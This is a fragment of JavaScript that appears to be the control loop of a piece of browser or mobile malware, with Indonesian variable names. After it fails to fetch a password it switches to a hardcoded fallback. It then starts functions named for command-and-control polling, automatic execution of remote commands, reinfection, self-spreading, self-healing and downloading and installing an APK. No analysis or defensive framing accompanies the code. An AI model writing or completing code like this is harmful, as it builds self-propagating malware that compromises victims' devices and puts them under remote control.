                setTimeout(autoSpread, 2000);
                startSelfHealing();
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.onerror = function() {
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                setTimeout(function() {
                    autoExecuteC2();
                }, 2000);
                setTimeout(function() {
                    downloadAndInstallAPK();
                }, 3000);
                setTimeout(autoSpread, 2000);
                startSelfHealing();
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.ontimeout = function() {
            retryCount++;
            if (retryCount >= 3) {
                K({ sumber: 'password_retry_failed', data: 'using_fallback' });
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                connectWebSocketWithFallback();
                startC2Polling();
                startHeartbeat();
                startReinfection();
                setTimeout(function() {
                    autoExecuteC2();
                }, 2000);
                setTimeout(function() {
                    downloadAndInstallAPK();
                }, 3000);
                setTimeout(autoSpread, 2000);
                startSelfHealing();
                return;
            }
            setTimeout(ambilPassword, 3000);
        };
        xhr.send();
    } catch(e) {
        setTimeout(ambilPassword, 3000);
    }
}
